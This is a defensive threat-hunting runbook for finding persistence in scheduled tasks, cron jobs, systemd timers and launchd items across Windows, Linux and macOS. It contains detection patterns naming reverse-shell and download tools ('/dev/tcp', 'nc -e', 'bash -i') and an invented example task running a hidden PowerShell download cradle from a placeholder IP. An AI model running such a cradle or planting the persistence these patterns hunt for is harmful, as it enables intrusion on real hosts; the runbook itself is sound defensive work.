---
title: Scheduled Task and Cron Persistence Review (Windows, Linux, macOS)
type: workflow
platforms: [Windows, Windows Server, Linux, Microsoft Defender, Splunk]
languages: [PowerShell, Windows CLI, Bash, KQL, SPL, MITRE ATT&CK]
tasks: [Threat Hunting, Investigation, Incident Response]
category: Workflow
security_domain: Endpoint
author: RJGProjectz
date_created: 2026-10-12
last_updated: 2026-10-12
tags: [workflow, scheduled tasks, cron, systemd timers, launchd, persistence, T1053, autoruns]
aliases: [scheduled task review, cron review, suspicious cron job, persistence sweep, launch agent review, review scheduled jobs, task scheduler audit, systemd timer persistence]
difficulty: intermediate
verified: true
last_verified: 2026-10-12
---

# Scheduled Task and Cron Persistence Review (Windows, Linux, macOS)
> **Created**: 2026-10-13T03:00:00Z
> **Last Modified**: 2026-10-13T03:00:00Z
> **Author**: RJGProjectz

> [!CAUTION]
> **SECURITY WARNING: VALIDATE BEFORE EXECUTION**
> Every command in steps 1–4 is read-only. Step 6 changes the system: export the evidence first, disable before you delete,
> and work under an authorised ticket.
>
> Commands were checked against Microsoft Learn, Sysinternals, the systemd/cron man pages and Apple's deployment guide
> (2026-10-12); the Windows PowerShell inventory was also run read-only on Windows 11.

**Trigger:** a periodic persistence sweep, a compromised or suspicious host, an EDR "scheduled task created" or "cron modified"
alert, or the start of an incident scope.

**Goal:** list every scheduled job on the host, separate the expected ones from the unexplained ones, and decide which to
investigate, disable or remove.

Scheduled jobs are one of the most common persistence methods on every OS (MITRE ATT&CK
[T1053](https://attack.mitre.org/techniques/T1053/): `.005` Scheduled Task, `.003` Cron, `.002` At, `.006` Systemd Timers;
macOS launchd jobs are [T1543.001](https://attack.mitre.org/techniques/T1543/001/) /
[T1543.004](https://attack.mitre.org/techniques/T1543/004/)). For a single alerted Windows task, use the shorter
[Scheduled Task Investigation](../investigation/scheduled-task-investigation.md).

## What "suspicious" looks like

Use this list on every OS. One flag is a reason to look; two or more is a reason to escalate.

| Red flag | Examples |
| --- | --- |
| Interpreter or LOLBin as the action | `powershell -enc`, `cmd /c`, `mshta`, `rundll32`, `regsvr32`, `wscript`, `certutil`; `bash -c`, `python -c`, `osascript` |
| Downloads or network in the command | `http(s)://`, `curl`, `wget`, `Invoke-WebRequest`, `bitsadmin`, `/dev/tcp/`, `nc` |
| Encoded or obfuscated text | Base64 blobs, `FromBase64String`, `base64 -d`, long random names |
| Runs from a user-writable path | `%AppData%`, `%Temp%`, `C:\Users\Public`, `C:\ProgramData`; `/tmp`, `/dev/shm`, `/var/tmp`, `/Users/Shared`, dot-folders in a home directory |
| High privilege with a short interval | `SYSTEM` or `root`, every 1–15 minutes, at logon, or at boot |
| Hidden or disguised | Hidden flag set, missing security descriptor, name copying a vendor (`GoogleUpdateTaskMachine1`, `com.apple.*` outside `/System`) |
| Unexplained origin | Unknown author, created recently, not owned by any installed package, unsigned binary, file no longer exists |

## 1. Windows — review in the GUI

**Task Scheduler** (`taskschd.msc`)

1. **View → Show Hidden Tasks**, then in the Actions pane **Enable All Tasks History** (if it is off).
2. Right-click the column header and add **Author**, **Created**, **Triggers** and **Last Run Time**. Sort by **Created**.
3. Expand every folder under **Task Scheduler Library**, not just the root. Do not skip `\Microsoft\Windows\`: attackers
   hide tasks there because analysts skip it.
4. For each unexplained task open **Actions** (program + arguments), **Triggers**, **General → When running the task, use the
   following user account** and **History**.

**Sysinternals Autoruns** (faster for a full sweep)

1. Run `Autoruns64.exe` as administrator and open the **Scheduled Tasks** tab.
2. **Options → Hide Microsoft Entries** (older builds: *Hide Signed Microsoft Entries*), **Options → Scan Options → Verify code signatures** (and optionally
   **Check VirusTotal.com**), then rescan.
3. Pink rows have no verified publisher; yellow rows point at a file that no longer exists. Both need an explanation.
4. **File → Save** the scan; next time **File → Compare** shows what changed.

**Event Viewer**: *Applications and Services Logs → Microsoft → Windows → TaskScheduler → Operational* (106 registered,
140 updated, 141 deleted, 200/201 action started/completed) and *Windows Logs → Security* (4698 created, 4702 updated).

## 2. Windows — review from the command line

=== "PowerShell: inventory"

    Every task with its action, run-as account and creation date, newest first.

    ```powershell
    Get-ScheduledTask | ForEach-Object {
        $task = $_
        $info = $task | Get-ScheduledTaskInfo -ErrorAction SilentlyContinue
        foreach ($action in $task.Actions) {
            [pscustomobject]@{
                Task      = $task.TaskPath + $task.TaskName
                State     = $task.State
                Author    = $task.Author
                Created   = $task.Date
                RunAs     = $task.Principal.UserId
                RunLevel  = $task.Principal.RunLevel
                Hidden    = $task.Settings.Hidden
                Execute   = $action.Execute
                Arguments = $action.Arguments
                LastRun   = $info.LastRunTime
            }
        }
    } | Sort-Object Created -Descending | Export-Csv -Path .\scheduled-tasks.csv -NoTypeInformation
    ```

=== "PowerShell: red flags"

    Only the tasks whose command matches a red flag from the table above. Expect some legitimate hits (vendor updaters,
    built-in tasks that use `rundll32`): this is the short list to explain, not a list of malware.

    ```powershell
    $pattern = 'powershell|pwsh|cmd\.exe|mshta|rundll32|regsvr32|wscript|cscript|certutil|bitsadmin|-enc|frombase64|https?://|\\AppData\\|\\Temp\\|\\Users\\Public\\|\\ProgramData\\'
    Get-ScheduledTask | ForEach-Object {
        $task = $_
        foreach ($action in $task.Actions) {
            $command = '{0} {1}' -f $action.Execute, $action.Arguments
            if ($command -match $pattern) {
                [pscustomobject]@{
                    Task    = $task.TaskPath + $task.TaskName
                    RunAs   = $task.Principal.UserId
                    Command = $command
                }
            }
        }
    } | Format-List
    ```

    Example output (captured on a clean Windows 11 workstation; the last entry is an invented bad one):

    ```text
    Task    : \Microsoft\Windows\Application Experience\PcaPatchDbTask
    RunAs   : SYSTEM
    Command : %windir%\system32\rundll32.exe %windir%\system32\PcaSvc.dll,PcaPatchSdbTask

    Task    : \Microsoft\Windows\ApplicationData\CleanupTemporaryState
    RunAs   : SYSTEM
    Command : %windir%\system32\rundll32.exe Windows.Storage.ApplicationData.dll,CleanupTemporaryState

    Task    : \OneDriveUpdate
    RunAs   : SYSTEM
    Command : powershell.exe -w hidden -c iex(iwr http://198.51.100.7/u.ps1)
    ```

    The clean workstation returned 26 hits, almost all built-in `rundll32` tasks under `\Microsoft\Windows\`. A task in
the root folder, named like a vendor updater, running a download cradle as SYSTEM is the pattern to act on.

=== "PowerShell: hidden tasks"

    A task whose `SD` (security descriptor) value was deleted from the registry still runs but no longer shows in
    Task Scheduler, `schtasks` or `Get-ScheduledTask`. Run as administrator.

    ```powershell
    Get-ChildItem -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree' -Recurse |
        Where-Object { $null -ne $_.GetValue('Id') -and $null -eq $_.GetValue('SD') } |
        Select-Object -ExpandProperty Name
    ```

=== "PowerShell: who created what"

    Security 4698 (created) and 4702 (updated) need *Audit Other Object Access Events*; they include the account and the task XML.

    ```powershell
    Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4698, 4702; StartTime = (Get-Date).AddDays(-30) } |
        ForEach-Object {
            $data = ([xml]$_.ToXml()).Event.EventData.Data
            [pscustomobject]@{
                Time = $_.TimeCreated
                Id   = $_.Id
                User = ($data | Where-Object Name -eq 'SubjectUserName').'#text'
                Task = ($data | Where-Object Name -eq 'TaskName').'#text'
            }
        }
    ```

=== "CMD / remote"

    `schtasks` works on any Windows build and against a remote host. Open the CSV in a spreadsheet and filter.

    ```text
    schtasks /query /fo csv /v > scheduled-tasks.csv
    schtasks /query /s <hostname> /fo csv /v > <hostname>-tasks.csv
    schtasks /query /tn "\<TaskPath>\<TaskName>" /xml
    ```

    Autoruns command-line version, scheduled tasks only, with signature check and hashes, Microsoft entries hidden:

    ```text
    autorunsc64.exe -accepteula -nobanner -a t -s -h -m -c > autoruns-tasks.csv
    ```

→ More task commands and storage locations: [Windows Scheduled Tasks](../../platforms/windows/scheduled-tasks.md)

## 3. Linux — review

**GUI**: there is no standard desktop tool. On servers with Cockpit, **Services → Timers** lists systemd timers;
KDE Plasma has **System Settings → Task Scheduler** for the current user's crontab. Use the CLI for a full review.

=== "Cron and at"

    ```bash
    # Every user's crontab (run as root)
    for u in $(cut -d: -f1 /etc/passwd); do
        jobs=$(crontab -l -u "$u" 2>/dev/null) && printf '### %s\n%s\n\n' "$u" "$jobs"
    done

    # System-wide cron
    cat /etc/crontab /etc/anacrontab 2>/dev/null
    ls -la /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly
    ls -la /var/spool/cron /var/spool/cron/crontabs 2>/dev/null

    # One-off at jobs: list, then print a job's full script
    atq
    at -c <job_id>
    ```

=== "systemd timers"

    ```bash
    # System timers, including inactive ones
    systemctl list-timers --all

    # Show the timer and the service it starts
    systemctl cat <name>.timer <name>.service

    # Unit files an admin or attacker added (packages install to /usr/lib/systemd)
    ls -la /etc/systemd/system/*.timer /etc/systemd/system/*.service 2>/dev/null

    # Per-user timers, which run without root
    ls -la /etc/systemd/user /home/*/.config/systemd/user /root/.config/systemd/user 2>/dev/null
    ```

=== "Red flags"

    ```bash
    # Suspicious content in any cron file or unit file
    grep -rEn 'curl|wget|base64|/dev/tcp|ncat|nc -e|bash -i|python[0-9.]* -c|/tmp/|/dev/shm/|/var/tmp/|chmod \+x' \
        /etc/crontab /etc/cron.* /var/spool/cron /etc/systemd/system /home/*/.config/systemd 2>/dev/null

    # Changed in the last 30 days
    find /etc/crontab /etc/cron.* /var/spool/cron /etc/systemd/system /home/*/.config/systemd \
        -type f -mtime -30 -ls 2>/dev/null

    # Files in cron directories that no package owns (Debian/Ubuntu; on RHEL use: rpm -qf "$f")
    for f in /etc/cron.d/* /etc/cron.hourly/* /etc/cron.daily/* /etc/cron.weekly/* /etc/cron.monthly/*; do
        dpkg -S "$f" >/dev/null 2>&1 || echo "not packaged: $f"
    done
    ```

=== "Logs"

    ```bash
    # Cron runs (the unit is cron on Debian/Ubuntu, crond on RHEL)
    journalctl -u cron -u crond --since "7 days ago"
    grep CRON /var/log/syslog      # Debian/Ubuntu
    cat /var/log/cron              # RHEL family

    # Crontab edits by any user
    journalctl _COMM=crontab --since "30 days ago"
    ```

    To record future changes, add audit watches (state change, needs approval):

    ```bash
    auditctl -w /etc/crontab -p wa -k cron
    auditctl -w /etc/cron.d/ -p wa -k cron
    auditctl -w /var/spool/cron/ -p wa -k cron
    auditctl -w /etc/systemd/system/ -p wa -k systemd
    ausearch -k cron -i
    ```

→ More: [Linux Cron and Scheduled Jobs](../../platforms/linux/cron.md) · [systemd timers](../../platforms/linux/systemd.md#timers)

## 4. macOS — review

**GUI**

- **System Settings → General → Login Items** (*Login Items & Extensions* on macOS 15 and later), section
  **Allow in the Background**: every launch agent and daemon registered by an app, with an on/off switch.
- Objective-See **KnockKnock** lists all persistent items with signature and VirusTotal status (the Autoruns equivalent).

**CLI**

```bash
# launchd jobs: daemons run as root, agents run as the logged-in user
ls -la /Library/LaunchDaemons /Library/LaunchAgents /Users/*/Library/LaunchAgents

# What each plist runs
for p in /Library/LaunchDaemons/*.plist /Library/LaunchAgents/*.plist /Users/*/Library/LaunchAgents/*.plist; do
    prog=$(/usr/libexec/PlistBuddy -c 'Print :Program' "$p" 2>/dev/null ||
           /usr/libexec/PlistBuddy -c 'Print :ProgramArguments:0' "$p" 2>/dev/null)
    printf '%s\t%s\n' "$p" "$prog"
done

# Full definition of one job, and its loaded state
plutil -p /Library/LaunchDaemons/<label>.plist
launchctl print system/<label>
launchctl list | grep -v com.apple

# Background items macOS has recorded (macOS 13+)
sudo sfltool dumpbtm

# Cron and periodic scripts still work on macOS
sudo ls -la /usr/lib/cron/tabs
ls -la /etc/periodic/daily /etc/periodic/weekly /etc/periodic/monthly

# Is the program signed, and by whom?
codesign -dv --verbose=2 /path/to/program
```

Look for `RunAtLoad` or `KeepAlive` set to true, programs in `/tmp`, `/Users/Shared` or hidden home folders, and labels that
copy Apple (`com.apple.*`) but live outside `/System/Library`.

## 5. Assess each unexplained job

1. **Who made it, and when?** Windows 4698 / TaskScheduler 106; Linux `journalctl _COMM=crontab`, file owner and mtime;
   macOS plist creation time (`stat -x <file>`). Line it up with logons on the host at that time.
2. **What does it run?** Hash and signature of the target file (`Get-FileHash` + `Get-AuthenticodeSignature`;
   `sha256sum`; `codesign -dv`). Read scripts before you run anything.
3. **Has it already run?** TaskScheduler 200/201, cron log lines, `launchctl print` (last exit status). Correlate with process
   creation at those times.
4. **Is it elsewhere?** Search the fleet for the same name, command or hash (step 7).

→ [Suspicious Process](../incident-response/suspicious-process.md) · [Malware Triage](../incident-response/malware-triage.md)

## 6. Contain and remediate

Preserve first: export the definition, copy the target file, record hashes in the ticket.

| OS | Preserve | Disable | Remove (after approval) |
| --- | --- | --- | --- |
| Windows | `schtasks /query /tn "<task>" /xml > task.xml` | `Disable-ScheduledTask -TaskName "<task>" -TaskPath "<path>"` | `Unregister-ScheduledTask -TaskName "<task>" -TaskPath "<path>" -WhatIf` |
| Linux cron | `crontab -l -u <user> > cron-<user>.bak` | Comment out the line with `crontab -e -u <user>` | `crontab -r -u <user>` (removes the whole crontab) |
| Linux timer | `systemctl cat <name>.timer <name>.service > unit.txt` | `systemctl disable --now <name>.timer` | Delete the unit files, then `systemctl daemon-reload` |
| macOS | `cp <plist> ./evidence/` | `sudo launchctl bootout system/<label>` | Delete the plist (and its program) |

| Finding | Action |
| --- | --- |
| Confirmed malicious | Isolate the host, disable the job, collect the payload, scope the fleet, start [Endpoint Triage](../incident-response/endpoint-triage.md) |
| Unknown, high-risk flags | Disable (do not delete), keep evidence, escalate |
| Legitimate but unexplained | Find the owner, document it, add it to the baseline |
| Benign and expected | Add to the baseline so the next review is shorter |

## 7. Scope across the fleet

```kql
// Microsoft Defender for Endpoint: Windows scheduled tasks created or changed (30 days)
DeviceEvents
| where Timestamp > ago(30d)
| where ActionType in ("ScheduledTaskCreated", "ScheduledTaskUpdated")
| extend Fields = parse_json(AdditionalFields)
| extend TaskName = tostring(Fields.TaskName), TaskContent = tostring(Fields.TaskContent)
| project Timestamp, DeviceName, InitiatingProcessAccountName, TaskName, TaskContent
```

```kql
// Microsoft Defender for Endpoint: Linux/macOS cron, systemd and launchd files written (30 days)
DeviceFileEvents
| where Timestamp > ago(30d)
| where FolderPath startswith "/etc/cron" or FolderPath startswith "/var/spool/cron"
    or FolderPath has "/systemd/system" or FolderPath has "/LaunchDaemons" or FolderPath has "/LaunchAgents"
| project Timestamp, DeviceName, ActionType, FolderPath, FileName, InitiatingProcessCommandLine
```

→ [SPL: scheduled task created (4698)](../../detection/spl/windows-events.md#scheduled-task-created-4698) ·
[KQL: scheduled task creation](../../detection/kql/file-registry-events.md#scheduled-task-creation) ·
[S1QL: scheduled task registration](../../detection/s1ql/hunting.md#scheduled-task-registration)

## Related

- [Scheduled Task Investigation](../investigation/scheduled-task-investigation.md) — one alerted Windows task
- [Registry Persistence Investigation](../investigation/registry-persistence.md)
- [Suspicious Service](../investigation/suspicious-service.md)
- [Hunting LOLBins](lolbins-execution-hunting.md)
- [Statistical Baselining & Frequency Analysis](statistical-baselining-frequency-analysis.md) — find rare tasks across many hosts

## External Resources & White Papers

- [MITRE ATT&CK T1053 — Scheduled Task/Job](https://attack.mitre.org/techniques/T1053/)
- [Microsoft Learn — Get-ScheduledTask](https://learn.microsoft.com/powershell/module/scheduledtasks/get-scheduledtask)
- [Microsoft Learn — schtasks query](https://learn.microsoft.com/windows-server/administration/windows-commands/schtasks-query)
- [Microsoft Learn — Event 4698](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4698)
- [Sysinternals Autoruns](https://learn.microsoft.com/sysinternals/downloads/autoruns)
- [systemd.timer(5)](https://www.freedesktop.org/software/systemd/man/latest/systemd.timer.html) · [crontab(5)](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [Apple — Creating Launch Daemons and Agents](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html)
- [Objective-See KnockKnock](https://objective-see.org/products/knockknock.html)
